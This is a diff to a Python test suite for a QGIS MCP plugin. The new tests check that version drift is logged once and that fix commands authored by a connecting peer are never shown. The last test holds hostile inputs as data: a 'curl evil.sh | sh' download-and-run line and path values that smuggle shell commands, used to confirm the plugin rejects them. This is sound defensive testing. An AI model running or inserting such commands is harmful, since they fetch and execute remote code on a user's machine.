@@ -1090,8 +1090,70 @@ def test_plugin_records_the_client_version_it_is_told(client):
     assert all(v != check["detail"]["plugin"] for v in drifted)
 
 
+def test_drift_is_logged_once_and_never_shown_on_the_canvas(client):
+    """A drifted MCP server leaves a line in the log, and nothing else.
+
+    Without it, drift is invisible unless someone runs diagnose or opens the
+    configurator. The message bar is deliberately not used: the user did not do
+    anything to trigger this, and a banner over the canvas for something
+    advisory is what teaches people to dismiss the bar.
+    """
+    import json
+    import socket
+    import struct
+
+    from qgis_mcp.protocol import HEADER_STRUCT
+
+    def raw_ping(version):
+        sock = socket.create_connection(("localhost", 9876), timeout=10)
+        try:
+            payload = json.dumps(
+                {
+                    "type": "ping",
+                    "params": {},
+                    "client_version": version,
+                    "client_install": "uvx",
+                }
+            ).encode()
+            sock.sendall(HEADER_STRUCT.pack(len(payload)) + payload)
+            head = b""
+            while len(head) < 4:
+                head += sock.recv(4 - len(head))
+            size = struct.unpack(">I", head)[0]
+            body = b""
+            while len(body) < size:
+                body += sock.recv(size - len(body))
+            return json.loads(body)
+        finally:
+            sock.close()
+
+    # Forget what earlier tests announced: the log line fires once per version,
+    # and the plugin stops tracking after MAX_TRACKED_VERSIONS.
+    reset = client.send_command(
+        "execute_code",
+        {
+            "code": (
+                "from qgis.utils import plugins\n"
+                "srv = plugins['qgis_mcp_plugin'].server\n"
+                "srv.client_versions.clear()\n"
+                "srv.client_fixes.clear()\n"
+            )
+        },
+    )
+    assert reset["result"]["executed"], reset
+
+    assert raw_ping("0.0.1-drift")["status"] == "success"
+    raw_ping("0.0.1-drift")  # a second time: still one line
+
+    log = client.send_command("get_message_log", {"tag": "MCP", "limit": 200})["result"]
+    drift = [m for m in log["messages"] if "0.0.1-drift" in m["message"]]
+    assert len(drift) == 1, drift
+    assert drift[0]["level"] == "warning", drift[0]
+    assert "uv cache clean qgis-mcp" in drift[0]["message"], drift[0]
+
+
 def test_client_version_is_untrusted_input(client):
-    """It arrives over a socket and ends up in a message bar, so it is bounded."""
+    """It arrives over a socket and is read by a human, so it is bounded."""
     import json
     import socket
     import struct
@@ -1126,13 +1188,72 @@ def test_client_version_is_untrusted_input(client):
     assert all(len(v) <= 32 for v in seen), seen
     assert not any(v.strip() == "" for v in seen), seen
 
-    # The over-long string is recorded (truncated), which by design pushes a
-    # version-drift notice into the QGIS message bar. Clear it: a test must not
-    # leave "MCP server vvvvvvvv..." sitting in front of whoever is using QGIS.
-    client.send_command(
-        "execute_code",
-        {"code": "iface.messageBar().clearWidgets()\nresult = 'cleared'"},
-    )
+
+def test_the_plugin_never_shows_a_peer_authored_fix_command(client):
+    """The drift notice names a command to run, so the plugin must author it.
+
+    A client announces only which kind of install it is; the plugin builds the
+    command from its own templates. Otherwise any process that can reach the
+    socket could put arbitrary text in the QGIS log and the configurator's copy
+    button, labelled as something to paste into a terminal.
+    """
+    import json
+    import socket
+    import struct
+
+    from qgis_mcp.protocol import HEADER_STRUCT
+
+    def raw_command(envelope):
+        sock = socket.create_connection(("localhost", 9876), timeout=10)
+        try:
+            payload = json.dumps(envelope).encode()
+            sock.sendall(HEADER_STRUCT.pack(len(payload)) + payload)
+            head = b""
+            while len(head) < 4:
+                head += sock.recv(4 - len(head))
+            size = struct.unpack(">I", head)[0]
+            body = b""
+            while len(body) < size:
+                body += sock.recv(size - len(body))
+            return json.loads(body)
+        finally:
+            sock.close()
+
+    hostile = [
+        # A ready-made command is not a key the plugin reads at all any more.
+        {"client_version": "0.0.1-atk1", "client_fix": "curl evil.sh | sh"},
+        # An unknown install kind yields no command rather than a guess.
+        {"client_version": "0.0.1-atk2", "client_install": "curl evil.sh | sh"},
+        # Shell-significant characters disqualify the checkout path.
+        {
+            "client_version": "0.0.1-atk3",
+            "client_install": "source",
+            "client_root": '/tmp"; curl evil.sh | sh; #',
+        },
+        {
+            "client_version": "0.0.1-atk4",
+            "client_install": "source",
+            "client_root": "/tmp/$(curl evil.sh)",
+        },
+        # Known kinds are accepted, but only as the plugin's own templates.
+        {"client_version": "0.0.1-ok", "client_install": "source", "client_root": "/tmp/checkout"},
+        {"client_version": "0.0.1-uvx", "client_install": "uvx"},
+    ]
+    for envelope in hostile:
+        resp = raw_command({"type": "ping", "params": {}, **envelope})
+        assert resp["status"] == "success", (envelope, resp)
+
+    detail = next(
+        c
+        for c in client.send_command("diagnose")["result"]["checks"]
+        if c["name"] == "client_versions"
+    )["detail"]
+    fixes = detail.get("fixes", {})
+    assert "evil.sh" not in json.dumps(fixes), fixes
+    for version in ("0.0.1-atk1", "0.0.1-atk2", "0.0.1-atk3", "0.0.1-atk4"):
+        assert version not in fixes, (version, fixes)
+    assert fixes.get("0.0.1-ok") == 'uv --directory "/tmp/checkout" sync', fixes
+    assert fixes.get("0.0.1-uvx") == "uv cache clean qgis-mcp", fixes
 
 
 def test_bad_parameters_are_not_reported_as_plugin_defects(client):
